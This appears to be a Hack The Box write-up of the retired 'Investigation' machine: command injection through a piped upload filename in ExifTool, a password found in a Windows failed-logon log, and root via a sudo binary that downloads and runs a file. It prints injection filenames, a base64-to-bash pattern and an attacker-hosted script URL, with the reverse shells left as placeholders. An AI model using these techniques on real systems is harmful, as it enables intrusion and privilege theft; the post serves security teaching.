---
layout: post
title: "The Filename Was the Command"
subtitle: "HTB Investigation, where a forensics company runs your photo's name through a shell, an admin's typo lands in a failed-login log, and root signs for a package nobody checked"
date: 2023-04-29 12:00:00 +0000
description: "A forensics shop runs ExifTool on your upload and never checks the filename, so the filename becomes the command, and the climb to root is one typo and one trusting download away."
image: /assets/og/the-filename-was-the-command.png
tags: [hackthebox, writeup]
---

Investigation is a forensics company that cannot read its own evidence. The whole box is about names and what people do with them. You hand the site a photo, and instead of looking at the picture it looks at the filename and runs it. Later you read a Windows log the company was supposed to be analyzing and find a password sitting in the wrong field, typed by an admin who fat-fingered a login years ago and never knew the mistake got written down. Then root signs for a package it never inspected. Three turns, and not one of them is a memory-corruption trick. Each one is somebody trusting a label, a log line, or a download to be exactly the harmless thing it claimed to be.

```
        e F O R E N Z I C S
        ===================
        upload:  ping -c 1 10.10.14.4|
                 exiftool reads the NAME, sees a pipe,
                 and runs the part before it.
                        |
                        v
        a failed login from years ago still whispers
        a password into a field where it never belonged.
                        |
                        v
        root downloads a file you wrote
        and runs it without reading a single line.
                                            証
```

## 0x01 · the front desk

Two ports, and the box wastes none of your time. `nmap -sC -sV` comes back almost bare.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Port 80 bounces you to `eforenzics.htb`, so drop that into your hosts file and look. It is a clean little site for a digital-forensics firm, the kind that promises to pull truth out of your evidence. The one page that matters is the service that offers image forensics. You upload a JPG, the server chews on it, and it hands you back a report full of metadata. Any time a site takes a file you control and runs a tool over it, the question is not whether the tool is safe. The question is whether anyone checked the thing you actually control, which here is the filename.

A quick `feroxbuster` confirms the shape of the app and turns up the upload handler. Nothing exotic. The interesting surface is that single upload box.

## 0x02 · the name that ran

The report leaks the version of the tool doing the reading, and it is ExifTool 12.37. That number is the whole foothold, because ExifTool before 12.38 carries CVE-2022-23935, and the bug is so clean it belongs in a textbook.

Here is what goes wrong, in plain terms. ExifTool is written in Perl, and Perl has an old, friendly, deeply dangerous habit baked into its `open()` function. If you ask Perl to open a filename that ends in a pipe character, Perl does not open a file at all. It treats the text before the pipe as a command, runs it, and hands you the output as if it were file contents. ExifTool, in this version, took the name of your uploaded file and passed it to that `open()` without scrubbing the pipe.

Think of it like a mail room with a rule that says any envelope ending in an exclamation point gets read aloud to the building over the intercom instead of delivered. You do not need to get inside. You just address your envelope correctly and let the rule do the work. The filename is the payload, and the part before the pipe is the only part that varies.

So you upload a perfectly ordinary image, but you name it like a command. Prove execution the boring, honest way first, by making the box ping you.

```
# filename of the uploaded image:
ping -c 1 10.10.14.4|

# on the attacker:
# tcpdump -i tun0 icmp
10.10.10.197 > 10.10.14.4: ICMP echo request
```

The echo lands. The site read the name, saw the pipe, and ran `ping`. Now trade the ping for a real callback. A filename only holds so many characters, so the usual move is to base64 a one-liner and decode it on the far side. I'm leaving the shell itself as a bracketed placeholder; build your own in a lab, don't lift a live one off a write-up.

```
# filename, conceptually:
echo <base64 of [ bash reverse shell back to 10.10.14.4 on 443 ]> | base64 -d | bash|
```

Start a listener, submit the upload, and a prompt drops in.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197]
$ id
uid=33(www-data) gid=33(www-data)
```

You are `www-data`, the low-privilege identity the web stack runs as. Not a person yet. Just a way in.

## 0x03 · the typo in the evidence

A forensics company keeps evidence lying around, and this one is no exception. Poke through the filesystem and you find a working directory for the firm's casework holding an email file, `Windows Event Logs for Analysis.msg`. A client sent in logs to be examined, which is the company's entire job, and the irony is that the evidence convicts the company itself.

A `.msg` is Outlook's format, awkward to read on Linux, so you convert it. `msgconvert` turns it into an mbox, `mutt` lets you pull the attachment out, and inside the zip is `security.evtx`, a Windows Security event log. To read a Windows binary log on a Linux attack box you reach for `evtx_dump`, which flattens the whole thing into JSON lines you can sift with `jq`.

```
$ msgconvert "Windows Event Logs for Analysis.msg"
$ mutt -f *.mbox        # save out the .zip attachment
$ unzip evtx-logs.zip   # -> security.evtx
$ evtx_dump -o jsonl security.evtx > sec.json
$ cat sec.json | jq 'select(.Event.System.EventID == 4625)'
```

Event ID 4625 is a failed logon, and that filter is where the box hides its key. Picture a security camera over the office keypad. It does not record successful entries, only the times someone fumbled the code. Most of those fumbles are noise. But one night an admin reached the username box, started typing, and got a beat ahead of themselves. They typed their password where their name should have gone, the login failed, and the camera dutifully wrote down exactly what they typed.

```
TargetUserName: "\Def@ultf0r3nz!csPa$$"
```

That string was never meant to be a username. It is a password, captured because the person typed it one field too early, and the logging system recorded the field faithfully without knowing it was holding a secret. The failure that should have protected the account is the same failure that wrote the secret down.

It pays off immediately. SSH in as the user on the box.

```
# ssh smorton@10.10.10.197
smorton@investigation:~$ cat user.txt
████████████████████████████████
```

## 0x04 · the package root never opened

`smorton` is not root, so check what the account is trusted to do. `sudo -l` is the first question you ask any Linux foothold, and here it answers loudly.

```
smorton@investigation:~$ sudo -l
User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

A custom binary, runnable as root, no password. There is no man page for this, so you pull the file back to your box and open it in Ghidra to watch what root will actually do on your behalf.

The logic, once decompiled, is short. It insists on running as root and on getting exactly three arguments. It checks that the second argument is the literal string `lDnxUysaQn`, a hardcoded password the author left in plain sight. If that gate passes, it takes the first argument as a URL, uses curl to download whatever lives there into a local file named `lDnxUysaQn`, and then runs that file with `perl ./lDnxUysaQn` before deleting it.

Read that twice, because it is the whole privesc. Root will fetch a file from any address you name and run it. The author imagined a forensics script. The program does not care what the file is.

Here is the lever that makes it trivial. Perl, when handed a script, honors the shebang line at the top. Think of it like a courier told to deliver a sealed box to whichever department the shipping label names. Perl opens your file, reads the first line, sees `#!/bin/bash`, and politely hands the whole thing to bash instead of running it as Perl. So you do not even need to write Perl. You write a bash script, label it for bash, and let root's own program route it where you want.

Stand up a web server, host a script with a bash shebang, and call the binary.

```
# on the attacker, serving over http:
$ cat iceberg.sh
#!/bin/bash
[ bash reverse shell back to 10.10.14.4 on 443 ]

# python3 -m http.server 80
```

```
smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.4/iceberg.sh lDnxUysaQn
```

Root downloads your file, perl reads the shebang, bash takes over, and the listener lights up.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.197]
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

There is also a narrower race to abuse if you ever needed it, the gap between curl finishing the download and perl running the file, where a writer who controls the directory could swap the contents underneath. You do not need it here. The shebang trick is one clean call. But it is worth seeing that a fetch-then-run binary leaks privilege in more than one seam.

## 0x05 · the honest caveat

Investigation is three trust failures stacked into a ladder, and none of them is a clever exploit. The ExifTool bug is the same disease as the oldest injection in the book. A program took a string a stranger controlled, the filename, and let part of it reach into the machinery and pull a lever instead of treating it as inert text. Patch ExifTool and that specific hole closes, but the lesson is not "update your metadata tool." It is that a filename, like a username or a search box or a log message, is an envelope that is only ever supposed to hold text. The moment its contents can give an order, you have rebuilt the bug in a new costume.

The log leak is the one that should keep defenders up at night, because nothing there was unpatched. The logging worked perfectly. It recorded a failed login exactly as designed, and in doing so it carved an admin's password into evidence and shipped that evidence to a third party for analysis. Secrets do not only leak through holes. Sometimes they leak through features doing precisely their job, which is why you scrub logs before you hand them to anyone and why a password typed in the wrong field is still a password forever.

And the root binary is the quiet horror. There was no vulnerability in the usual sense, no overflow, no corruption. Someone wrote a helper that fetches a file and runs it as root, gated it behind a password printed in the binary itself, and trusted that the file at the other end would be friendly. A program that downloads instructions and executes them without ever reading them is not a tool. It is a door with the lock built into the handle. You cannot fix that with an update. You fix it by never trusting a download to be what its sender promised.

## 0x06 · outro

```
the company read the name on the photo and ran it.
the log wrote down the password an admin typed by mistake.
root fetched your file and ran it without reading a word.

three labels. nobody checked what was written under any of them.

scrub the name. scrub the log. read what root runs. wear black.

                                                            EOF
```

---

*HTB: Investigation, retired 22 Apr 2023. A medium Linux box that is really a lecture on trusting labels, wearing a forensics lab coat. The pipe in the filename still runs in a lab and nowhere you don't own.*